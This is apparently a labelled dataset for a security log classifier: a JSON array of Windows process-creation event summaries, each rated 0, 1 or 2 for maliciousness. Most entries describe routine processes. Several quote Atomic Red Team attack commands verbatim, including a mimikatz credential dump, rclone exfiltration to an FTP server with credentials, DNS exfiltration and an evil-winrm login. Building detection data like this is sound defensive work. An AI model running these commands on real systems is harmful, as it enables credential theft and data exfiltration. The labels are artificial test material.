@@ -1,0 +1,2974 @@
+[
+    [
+        "Process launched with command: `\\\"C:\\Windows\\system32\\whoami.exe\\\"`.",
+        1
+    ],
+    [
+        "`WmiPrvSE.exe` (PID: 6692) launched with the command `-secured -Embedding` by `svchost.exe` (PID: 916.0). It ran under `NT AUTHORITY\\ETWORK SERVICE`.",
+        0
+    ],
+    [
+        "Process `SearchFilterHost.exe` was launched by `SearchIndexer.exe`, both running under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\HOSTNAME.EXE` was executed, but the parent process and other details are missing. It ran under user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`whoami.exe` executed with the command:  `C:\\Windows\\system32\\whoami.exe`.",
+        1
+    ],
+    [
+        "Event ID 1 - Process `powershell.exe` (PID: 14104) launched running the same suspicious script (`Invoke-MalDoc.ps1`) from an external URL. It ran from the `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` directory under High integrity.",
+        2
+    ],
+    [
+        "Process `GoogleUpdater.exe` launched under `NT AUTHORITY\\SYSTEM` without command or parent process.",
+        1
+    ],
+    [
+        "`powershell.exe` (PID: 3856) launched with no command details. Parent process and directory information are missing.",
+        1
+    ],
+    [
+        "`conhost.exe` (PID: 7660) launched by `svchost.exe` located in `AppData\\Local\\Temp`.",
+        2
+    ],
+    [
+        "`WmiPrvSE.exe` launched by `svchost.exe` with legitimate arguments under `NT AUTHORITY\\ETWORK SERVICE`.",
+        0
+    ],
+    [
+        "Process `SearchProtocolHost.exe` launched by `SearchIndexer.exe` with several arguments.",
+        0
+    ],
+    [
+        "`powershell.exe` launched from `AppData\\Local\\Temp` with a command referencing `calc.exe`.",
+        2
+    ],
+    [
+        "`whoami.exe` launched from a non-standard directory.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 14308) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` with a clear parent process missing.",
+        1
+    ],
+    [
+        "`whoami.exe` was executed with no associated command line or parent process information.",
+        1
+    ],
+    [
+        "`powershell.exe` executed obfuscated and potentially malicious commands.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` launched by PowerShell.",
+        1
+    ],
+    [
+        "`conhost.exe` (PID: 7332) launched without command or parent details.",
+        1
+    ],
+    [
+        "Process `SearchProtocolHost.exe` launched with no arguments or parent process information.",
+        0
+    ],
+    [
+        "`whoami.exe` executed.",
+        1
+    ],
+    [
+        "`svchost.exe` (PID: 10680) launched.",
+        0
+    ],
+    [
+        "Event ID: 1  Process: `C:\\Windows\\System32\\whoami.exe`  Command: `\\\"C:\\Windows\\system32\\whoami.exe\\\"`  Parent Process: `-` (Unknown)  Execution Directory: `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`  Integrity Level: `High`",
+        1
+    ],
+    [
+        "Process `SearchFilterHost.exe` was launched with typical arguments, spawned by `SearchIndexer.exe`, running in `C:\\Windows\\system32\\` under `NT AUTHORITY\\SYSTEM` with medium integrity.",
+        0
+    ],
+    [
+        "Process `conhost.exe` was launched with no command or parent process information. User: `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`hostname.exe` launched with no command-line arguments or parent process information.",
+        1
+    ],
+    [
+        "`cmd.exe` launched with no parameters under user `bazinga`.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 14312) was launched with no command line arguments or parent process information. The process ran with no directory or integrity level details under user `bazinga`.",
+        1
+    ],
+    [
+        "`wmic` executed to enumerate all user accounts.",
+        2
+    ],
+    [
+        "Process `powershell.exe` (PID: 6004) was launched without a parent process or command details.",
+        2
+    ],
+    [
+        "Process `C:\\Windows\\System32\\SearchProtocolHost.exe` (PID: 1356) launched by `SearchIndexer.exe` with typical parameters.",
+        0
+    ],
+    [
+        "Event ID 1 indicates `conhost.exe` (PID: 13844) was launched via `powershell.exe` (PID: 4780). The PowerShell command executed an `rclone` binary located in `C:\\Users\\Public\\Downloads\\` to exfiltrate a file (`exfil.zip`) to an FTP server (`ftp.dlptest.com`) using credentials (`dlpuser`/`rNrKYTX9g7z3RgJRmxWuGHbeu`).",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` was launched from a directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under user `bazinga`.",
+        1
+    ],
+    [
+        "`whoami.exe` was launched by an unidentified parent process in a directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`schtasks.exe` launched without detailed command or parent process information.",
+        1
+    ],
+    [
+        "`whoami.exe` (`PID: 3976`) executed without arguments. No parent process is recorded. Process ran under user `bazinga` with unspecified integrity level.",
+        1
+    ],
+    [
+        "`whoami.exe` was launched with no command details or parent process information.",
+        1
+    ],
+    [
+        "Process `conhost.exe` was launched with the argument `0xffffffff -ForceV1`, spawned by `cmd.exe` during the execution of `Outflank-Dumpert.exe`.",
+        1
+    ],
+    [
+        "A high-integrity PowerShell process launched `mavinject.exe` to inject a malicious DLL into `notepad.exe`.",
+        2
+    ],
+    [
+        "PowerShell (`powershell.exe`) was executed from `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\` under the user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`conhost.exe` (PID: 8756) was launched from `C:\\Windows\\System32\\`.",
+        0
+    ],
+    [
+        "Process `SearchProtocolHost.exe` was launched by `SearchIndexer.exe` under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`svchost.exe` (PID: 13388) launched with the `NgcSvc` service under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`conhost.exe` (PID: 4648) was launched with an unknown command. No parent process or integrity level is specified.",
+        0
+    ],
+    [
+        "`whoami.exe` was launched from the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4` under the user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`whoami.exe` and `hostname.exe` executed in sequence from the `SecureSLM\\Run4` directory.",
+        1
+    ],
+    [
+        "`PowerShell.exe` (PID: 4588) launched with a suspicious command to execute process injection.",
+        2
+    ],
+    [
+        "`conhost.exe` launched by `powershell.exe` under user `DESKTOP-DU6JNPV\\bazinga`.",
+        2
+    ],
+    [
+        "`csc.exe` launched by PowerShell to compile .NET code.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` (`PID: 3432`) executed with standard arguments. Parent process is unspecified (`PID: 8924`). Process ran in `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under `High` integrity level.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\conhost.exe` was launched by PowerShell (`powershell.exe`) with a command to establish a new PSDrive mapped to `\\\\Target\\C$`.",
+        2
+    ],
+    [
+        "Process `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` (PID: 6720) launched with no command-line arguments or parent process.",
+        1
+    ],
+    [
+        "Event ID: 1  Process: `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`  Command: `\\\"powershell.exe\\\" & {Invoke-Expression \\\\\"\\\"C:\\AtomicRedTeam\\atomics\\T1027.004\\bin\\T1027.004_DynamicCompile.exe\\\\\"\\\"}`Parent Process: `-` (Unknown)  Integrity Level: `High`  Execution Directory: `C:\\Users\\bazinga\\AppData\\Local\\Temp\\`",
+        2
+    ],
+    [
+        "`conhost.exe` was launched, but critical details (parent process, command line, directory, integrity level) are missing.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` launched with no arguments by an unknown process.",
+        1
+    ],
+    [
+        "Process `HOSTNAME.EXE` (PID: 11104) was spawned by `PowerShell.exe`.",
+        1
+    ],
+    [
+        "Process `SearchFilterHost.exe` was launched by `SearchIndexer.exe` under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "Process `whoami.exe` (PID: 7916) launched without a parent process or command-line arguments. The process ran under user `bazinga`.",
+        1
+    ],
+    [
+        "`notepad.exe` was launched from `AppData\\Roaming` without a parent process or command-line arguments.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\conhost.exe` (PID: 7624) launched via `cmd.exe`.",
+        2
+    ],
+    [
+        "`WmiPrvSE.exe` launched under `NT AUTHORITY\\ETWORK SERVICE`.",
+        0
+    ],
+    [
+        "`powershell.exe` launched from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` under user `DESKTOP-DU6JNPV\\bazinga`.",
+        2
+    ],
+    [
+        "Another instance of `schtasks.exe` was launched without a parent process or command details.",
+        1
+    ],
+    [
+        "`conhost.exe` was executed by `cmd.exe` with parameters indicative of terminal emulation. The parent process (`cmd.exe`) was used to invoke `csc.exe` for compiling the `calc.cs` file.",
+        1
+    ],
+    [
+        "`notepad.exe` was executed with `/B` (batch processing) from `cmd.exe` in the `AppData\\Local\\Temp` directory.",
+        2
+    ],
+    [
+        "Process `HOSTNAME.EXE` launched with missing parent process and directory details under user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "Process `SearchFilterHost.exe` launched with missing parent process and directory details under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`cmd.exe` launched with a complex batch command from the `Temp` directory.",
+        2
+    ],
+    [
+        "Process `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` (PID: 6720) launched from the `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` directory with the same file creation command as in Log Entry 4.",
+        2
+    ],
+    [
+        "- Process: `WmiPrvSE.exe` (PID: 4608)  - Parent Process: `svchost.exe` (PID: 916)  - Command Line: `wmiprvse.exe -Embedding`  - User: `NT AUTHORITY\\SYSTEM`  - Integrity Level: System",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\conhost.exe` (PID: 11048) launched by `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` with a suspicious PowerShell command.",
+        2
+    ],
+    [
+        "`C:\\Windows\\System32\\conhost.exe` (PID: 4784) was launched.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\conhost.exe` (PID: 4928) was launched with no command-line arguments, no parent process, and minimal context.",
+        1
+    ],
+    [
+        "`SearchProtocolHost.exe` was launched by `SearchIndexer.exe` with typical parameters.",
+        0
+    ],
+    [
+        "`HOSTNAME.EXE` was launched with no command details or parent process information.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\wbem\\WmiPrvSE.exe` (PID: 5696) was launched by `C:\\Windows\\System32\\svchost.exe` (PID: 916.0).",
+        0
+    ],
+    [
+        "`whoami.exe` was executed without a clear parent process or command. Key details such as directory and integrity level are missing.",
+        1
+    ],
+    [
+        "`backgroundTaskHost.exe` launched by `svchost.exe` with command-line argument referencing an `AppX` package.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\SearchFilterHost.exe` (PID: 11624) was launched by `C:\\Windows\\System32\\SearchIndexer.exe`.",
+        0
+    ],
+    [
+        "Second instance of `cmd.exe` launched without parameters under user `bazinga`.",
+        1
+    ],
+    [
+        "Process `WmiPrvSE.exe` launched by `svchost.exe` under `NT AUTHORITY\\ETWORK SERVICE`.",
+        0
+    ],
+    [
+        "Process `powershell.exe` (PID: 15260) was launched with no visible parent or command details.",
+        1
+    ],
+    [
+        "Process `HOSTNAME.EXE` (PID: 7104) was launched using the command `C:\\Windows\\system32\\HOSTNAME.EXE`. It was spawned by an unknown parent process (`PID: 8924`) and executed in the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under user `DESKTOP-DU6JNPV\\bazinga` with high integrity.",
+        1
+    ],
+    [
+        "Process `whoami.exe` launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`whoami.exe` launched from the `Documents\\SecureSLM\\Run4\\` directory.",
+        1
+    ],
+    [
+        "`audiodg.exe` (PID: 11768) launched with audio-related parameters under `NT AUTHORITY\\LOCAL SERVICE`.",
+        0
+    ],
+    [
+        "Process `WmiPrvSE.exe` (PID: 2404) was launched by `svchost.exe` (PID: 856.0) using the command: `wmiprvse.exe -secured -Embedding`. Ran under `NT AUTHORITY\\ETWORK SERVICE` with `System` integrity level.",
+        0
+    ],
+    [
+        "`notepad.exe` launched without parent process or command under `bazinga`.",
+        1
+    ],
+    [
+        "`findstr` executed to filter output of `qwinsta` command targeting a remote server.",
+        1
+    ],
+    [
+        "- Process: `notepad.exe` (PID: 14184)  - Parent Process: `WmiPrvSE.exe` (PID: 14632)  - Command Line: `notepad.exe`  - User: `DESKTOP-DU6JNPV\\bazinga`  - Integrity Level: High",
+        1
+    ],
+    [
+        "An unidentified process launched without detailed command or parent process information.",
+        1
+    ],
+    [
+        "`whoami.exe` launched with PowerShell as its parent process.",
+        1
+    ],
+    [
+        "`WmiPrvSE.exe` launched by `svchost.exe` under `NT AUTHORITY\\ETWORK SERVICE`.",
+        0
+    ],
+    [
+        "`conhost.exe` (PID: 8264) was launched by `cmd.exe` (PID: 4592) with the command:    `\\\"cmd.exe\\\" /c \\\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\x64\\mimikatz.exe\\\" \\\"sekurlsa::minidump %tmp%\\lsass.DMP\\\" \\\"sekurlsa::logonpasswords full\\\" exit`.",
+        2
+    ],
+    [
+        "`whoami.exe` launched by PowerShell.",
+        1
+    ],
+    [
+        "PowerShell launched `RedInjection.exe` with process manipulation commands.",
+        2
+    ],
+    [
+        "Process `msiexec.exe` launched by `services.exe` with the argument `/V`.",
+        1
+    ],
+    [
+        "Process `SearchProtocolHost.exe` was launched by `SearchIndexer.exe` under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "Event ID 1 - Process `SearchProtocolHost.exe` (PID: 10816) launched with command `SearchProtocolHost.exe` and spawned by `SearchIndexer.exe`.",
+        0
+    ],
+    [
+        "Process `HOSTNAME.EXE` (PID: 2916) launched from the `SecureSLM\\Run4` directory under user `bazinga`.",
+        1
+    ],
+    [
+        "Process `whoami.exe` (PID: 2604) was launched with no apparent command. It was spawned by an unknown parent process (`PID: -1`) and executed with no directory information under user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\HOSTNAME.EXE` (PID: 7720) was launched with no command-line arguments or parent process.",
+        1
+    ],
+    [
+        "`conhost.exe` launched by `RedInjection.exe` with unusual parameters.",
+        2
+    ],
+    [
+        "Process `nanodump.x64.exe` launched from a non-standard directory (`AppData\\Local\\Temp`) by `cmd.exe`.",
+        2
+    ],
+    [
+        "PowerShell (`powershell.exe`) was launched from `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\` with no command-line arguments. Parent process information is missing.",
+        1
+    ],
+    [
+        "`cmd.exe` launched with no command-line arguments.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` was launched with no provided command or parent process details under the user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID 13916) was executed from the `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` directory. The parent process (PID: 8924) is unknown.",
+        1
+    ],
+    [
+        "Process `HOSTNAME.EXE` (PID: 11104) was launched from `C:\\Windows\\System32`.",
+        1
+    ],
+    [
+        "`reg.exe` modified the registry to set `calc.exe` as the handler for `.msc` files.",
+        2
+    ],
+    [
+        "`C:\\Windows\\System32\\conhost.exe` was launched by PowerShell with the command:    `powershell.exe & {Get-Content \\\"C:\\AtomicRedTeam\\atomics\\T1001.002\\bin\\T1001.002.jpg\\\" \\\"$env:PUBLIC\\Downloads\\T1001.002.tarz\\\" -Encoding byte -ReadCount 0 | Set-Content \\\"$env:PUBLIC\\Downloads\\T1001.002New.jpg\\\" -Encoding byte}`.    This process ran under user `DESKTOP-DU6JNPV\\bazinga` with `High` integrity.",
+        2
+    ],
+    [
+        "`SearchProtocolHost.exe` (PID: 6296) launched by `SearchIndexer.exe`.",
+        0
+    ],
+    [
+        "`HOSTNAME.EXE` was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 7012) was executed by `PowerShell.exe`.",
+        1
+    ],
+    [
+        "`conhost.exe` (PID: 14688) was launched by `cmd.exe` (PID: 12928) with the command `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`.",
+        0
+    ],
+    [
+        "`WmiPrvSE.exe` launched by `svchost.exe`.",
+        0
+    ],
+    [
+        "`conhost.exe` launched by `cmd.exe` during execution of the malicious command chain.",
+        1
+    ],
+    [
+        "PowerShell was used to script and execute the dumping of LSASS memory via `rdrleakdiag.exe`. Commands include testing paths, creating directories, and launching processes.",
+        2
+    ],
+    [
+        "Process `whoami.exe` (PID: 392) was launched with the command: `\\\"C:\\Windows\\system32\\whoami.exe\\\"`, spawned by an unknown parent (PID: 7468.0). Ran in `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3\\` under user `DESKTOP-DU6JNPV\\bazinga` with `High` integrity level.",
+        2
+    ],
+    [
+        "`conhost.exe` launched by PowerShell with a complex script performing network scans.",
+        2
+    ],
+    [
+        "Process `C:\\Windows\\System32\\cmd.exe` (PID: 9504) was launched with missing parent and command-line details.",
+        1
+    ],
+    [
+        "`powershell.exe` (PID: 2340) executed a script to register a scheduled task using WMI and XML from the `AtomicRedTeam` folder. The process ran from the `AppData\\Local\\Temp` directory with high integrity under user `bazinga`.",
+        2
+    ],
+    [
+        "- Process: `whoami.exe` (PID: 12440)  - Parent Process: `-` (Unknown PID: 8924)  - Command Line: `\\\"whoami.exe\\\"`  - User: `DESKTOP-DU6JNPV\\bazinga`  - Integrity Level: High",
+        1
+    ],
+    [
+        "`cmd.exe` executed with the command:  `cmd.exe /c copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe & C:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt`.",
+        2
+    ],
+    [
+        "Process `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` (PID: 5920) was launched from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` with the same command: `\\\"powershell.exe\\\" & {evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1}`.",
+        2
+    ],
+    [
+        "On 7/7/2025 11:11:58 AM, `powershell.exe` (PID: 1176) executed with the command:  `IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))`.  It was spawned by another `powershell.exe` (PID: 3132) running from the `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` directory.",
+        2
+    ],
+    [
+        "`whoami.exe` was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 6372) was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under a high-integrity context.",
+        1
+    ],
+    [
+        "`HxTsr.exe` was launched with no command-line arguments or parent process information.",
+        0
+    ],
+    [
+        "`conhost.exe` (PID: 1764) launched from `C:\\Windows\\System32\\` under user `DESKTOP-DU6JNPV\\bazinga`. No parent process recorded.",
+        0
+    ],
+    [
+        "Event ID 1 - Execution of `nanodump.x64.exe` from `C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads`.",
+        2
+    ],
+    [
+        "Event ID 1: `conhost.exe` launched from `C:\\Windows\\System32`.  - Command: `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`.  - Parent Process: `powershell.exe` (PID: 13764).  - Command of Parent:    ```  powershell.exe & {Import-Module \\\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\dnsexfil.ps1\\\"   Invoke-DNSExfiltrator -i \\\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\dnsexfil.ps1\\\" -d target.example.com -p atomic -doh google -t 500}  ```- User: `DESKTOP-DU6JNPV\\bazinga`.",
+        2
+    ],
+    [
+        "HOSTNAME.EXE was executed with the command `C:\\Windows\\system32\\HOSTNAME.EXE`, running in `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4` under user `bazinga`.",
+        1
+    ],
+    [
+        "A complex chain of commands involving `whoami`, `wmic`, `quser`, and `qwinsta` executed via `cmd.exe`.",
+        2
+    ],
+    [
+        "`svchost.exe` (PID: 11596) launched with `-k netsvcs -p -s BITS`.",
+        0
+    ],
+    [
+        "Process `whoami.exe` (PID: 6968) executed with the command `\\\"whoami.exe\\\"`, spawned by an unidentified parent process.",
+        1
+    ],
+    [
+        "Hostname.exe launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` with High integrity.",
+        1
+    ],
+    [
+        "`xordump.exe` (PID: 5872) was launched from `C:\\Windows\\Temp\\` with parameters to create a dump of `lsass.exe` in `C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp`.",
+        2
+    ],
+    [
+        "Process `whoami.exe` (PID: 7576) was launched with an empty command line. It was spawned by an unknown parent process (PID: -1.0) under user `bazinga`.",
+        1
+    ],
+    [
+        "`conhost.exe` launched with command:  `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`.",
+        1
+    ],
+    [
+        "`SearchProtocolHost.exe` (PID: 8216) launched under `NT AUTHORITY\\SYSTEM`. No parent process recorded.",
+        0
+    ],
+    [
+        "- `conhost.exe` (PID: 5844) was launched as a child process of the same PowerShell instance (PID: 6276) responsible for executing `createdump.exe`.",
+        1
+    ],
+    [
+        "Event ID 1 - Process `whoami.exe` (PID: 8040) launched with the command `\\\"C:\\Windows\\system32\\whoami.exe\\\"`. It ran from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under High integrity.",
+        1
+    ],
+    [
+        "Process `SearchFilterHost.exe` (PID: 5356) launched by `SearchIndexer.exe` (PID: 4244) running under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`conhost.exe` (PID: 1764) launched via PowerShell (PID: 9976) with the command `python T1046.py`.",
+        2
+    ],
+    [
+        "`C:\\Windows\\System32\\whoami.exe` and `hostname.exe` executed from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "Process `procdump64.exe` was used to dump the memory of `lsass.exe` into `C:\\Windows\\Temp\\lsass_dump.dmp`. It was launched from a temporary directory (`AppData\\Local\\Temp`) by another instance of `procdump.exe`.",
+        2
+    ],
+    [
+        "`whoami.exe` was launched, but details are missing.",
+        0
+    ],
+    [
+        "`UsoClient.exe` launched by PowerShell with another `iex` command downloading a script from GitHub.",
+        2
+    ],
+    [
+        "Process `C:\\Windows\\System32\\SearchFilterHost.exe` (PID: 1200) launched by `SearchIndexer.exe` with typical parameters.",
+        0
+    ],
+    [
+        "The `whoami.exe` process was executed from `C:\\Windows\\System32` with the command `\\\"C:\\Windows\\system32\\whoami.exe\\\"`. It was spawned by `powershell.exe` running from the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3\\` under the user `DESKTOP-DU6JNPV\\bazinga` with high integrity.",
+        2
+    ],
+    [
+        "`Hostname.exe` was launched with no command-line arguments, no parent process, and no integrity level specified. The user context is `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 13464) launched with the command `C:\\Windows\\system32\\whoami.exe`. It was spawned by a process with PID: 8924 and executed in the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under user `bazinga` with high integrity.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 9316) launched with no command-line arguments by an unknown parent process.",
+        1
+    ],
+    [
+        "Event ID 5: `HOSTNAME.EXE` launched from `C:\\Windows\\System32`.  - Command: None.  - Parent Process: Not recorded (PID: -1.0).  - User: `DESKTOP-DU6JNPV\\bazinga`.",
+        0
+    ],
+    [
+        "Process `SearchProtocolHost.exe` (PID: 13692) was launched by `SearchIndexer.exe` with system integrity level.",
+        0
+    ],
+    [
+        "`conhost.exe` was launched with no command or parent process information under user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "Process `conhost.exe` (PID: 5016) launched via `cmd.exe` executing a suspicious PowerShell script targeting removable drives.",
+        2
+    ],
+    [
+        "`taskhostw.exe` launched with `LocalUserSyncDataAvailable` by `svchost.exe`.",
+        0
+    ],
+    [
+        "Event ID 1 - Process `HOSTNAME.EXE` (PID: 14928) launched with the command `\\\"C:\\Windows\\system32\\HOSTNAME.EXE\\\"`. It ran from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under High integrity.",
+        1
+    ],
+    [
+        "The `esentutl.exe` process was executed via `cmd.exe` to copy the SAM database (`C:\\Windows/system32/config/SAM`) to a temporary directory (`C:\\Users\\bazinga\\AppData\\Local\\Temp/SAM`).",
+        2
+    ],
+    [
+        "`C:\\Windows\\System32\\WerFault.exe` launched with no command-line arguments and missing parent process information.",
+        1
+    ],
+    [
+        "`RuntimeBroker.exe` (PID: 8244) launched with no command details, ran under `DESKTOP-DU6JNPV\\bazinga`.",
+        0
+    ],
+    [
+        "Process `cmd.exe` was launched from `C:\\ProgramData\\` by `powershell.exe` with a command that copies `cmd.exe` to `C:\\ProgramData\\` and launches it. User: `DESKTOP-DU6JNPV\\bazinga`.",
+        2
+    ],
+    [
+        "`whoami.exe` launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`whoami.exe` was executed by a PowerShell process running from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3`. The integrity level was `High`.",
+        1
+    ],
+    [
+        "Process `SearchFilterHost.exe` was spawned by `SearchIndexer.exe` to perform indexing tasks under the `SYSTEM` user.",
+        0
+    ],
+    [
+        "`conhost.exe` (PID: 3996) launched by `powershell.exe`.",
+        1
+    ],
+    [
+        "`SearchProtocolHost.exe` was launched by `SearchIndexer.exe` with legitimate command-line arguments.",
+        0
+    ],
+    [
+        "Process `whoami.exe` (PID: 8616) launched without a clear parent process or command parameters.",
+        1
+    ],
+    [
+        "Process `powershell.exe` (PID: 7452) launched with no specified command, parent process, or integrity level.",
+        2
+    ],
+    [
+        "`conhost.exe` (PID: 11812) was launched with no command line arguments, no parent process, and ran under user `bazinga`.",
+        0
+    ],
+    [
+        "Event ID: 5  Process: `C:\\Windows\\System32\\HOSTNAME.EXE`  Command: Not provided  Parent Process: `-` (Unknown)  Integrity Level: Not provided",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\smartscreen.exe` was executed with command `C:\\Windows\\System32\\smartscreen.exe -Embedding` by `svchost.exe`.",
+        0
+    ],
+    [
+        "`conhost.exe` launched without a parent process or command-line arguments under user `bazinga`.",
+        1
+    ],
+    [
+        "Process `whoami.exe` was launched from the `Documents\\SecureSLM\\Run4` directory with a `High` integrity level.",
+        1
+    ],
+    [
+        "`cmd.exe` was launched without a parent process, command line, or directory information.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\SearchFilterHost.exe` (PID: 7792) launched.",
+        0
+    ],
+    [
+        "`conhost.exe` (PID: 2624) launched by `cmd.exe` in the chain of `net use` execution.",
+        1
+    ],
+    [
+        "`svchost.exe` launched with `LocalServiceNetworkRestricted` and `WinHttpAutoProxySvc`.",
+        0
+    ],
+    [
+        "On 7/7/2025 10:55:50 AM, `C:\\Windows\\System32\\conhost.exe` was launched by `powershell.exe` with the command:  `powershell.exe & {Enable-PSRemoting -Force Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}}`.",
+        2
+    ],
+    [
+        "`csc.exe` compiled a script in the temporary directory, invoked by PowerShell with a remote script download.",
+        2
+    ],
+    [
+        "`reg.exe` (PID: 8420) saved the `HKLM\\sam` registry hive to a temporary directory. Parent process: `cmd.exe`.",
+        2
+    ],
+    [
+        "Process `SearchFilterHost.exe` launched with no arguments or parent process information.",
+        0
+    ],
+    [
+        "Process `HOSTNAME.EXE` (PID: 3712) was launched with an empty command line. It was spawned by an unknown parent process (PID: -1.0) under user `bazinga`.",
+        0
+    ],
+    [
+        "`reg.exe` exported sensitive registry hives (`HKLM\\security`, `HKLM\\sam`, `HKLM\\system`) to a temporary directory.",
+        2
+    ],
+    [
+        "`dllhost.exe` (PID: 15292) was launched with no command or parent process information.",
+        1
+    ],
+    [
+        "`powershell.exe` (PID: 9628) executed a script to copy and execute `svchost.exe` in `AppData\\Local\\Temp`.",
+        2
+    ],
+    [
+        "`WmiPrvSE.exe` was launched by `svchost.exe` with typical parameters.",
+        0
+    ],
+    [
+        "`RuntimeBroker.exe` was launched by `svchost.exe` with expected arguments.",
+        0
+    ],
+    [
+        "Process `whoami.exe` (PID: 5132) launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` with high integrity level.",
+        1
+    ],
+    [
+        "`notepad.exe` was launched with `C:\\Windows\\System32\\wbem\\WmiPrvSE.exe` as its parent process under the user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`whoami.exe` (PID: 12148) was invoked by `powershell.exe` (PID: 4000).",
+        1
+    ],
+    [
+        "`mavinject.exe` was used to inject a DLL (`T1055.001.dll`) into a running `notepad.exe` process.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` was executed without a clear parent process or command. Key details such as directory and integrity level are missing.",
+        1
+    ],
+    [
+        "`whoami.exe` launched with empty command-line arguments and no parent process.",
+        1
+    ],
+    [
+        "`whoami.exe` was executed with no discernible parent process or directory information.",
+        1
+    ],
+    [
+        "- Process: `HOSTNAME.EXE` (PID: 11548)  - Parent Process: `-` (Unknown PID: 8924)  - Command Line: `\\\"HOSTNAME.EXE\\\"`  - User: `DESKTOP-DU6JNPV\\bazinga`  - Integrity Level: High",
+        1
+    ],
+    [
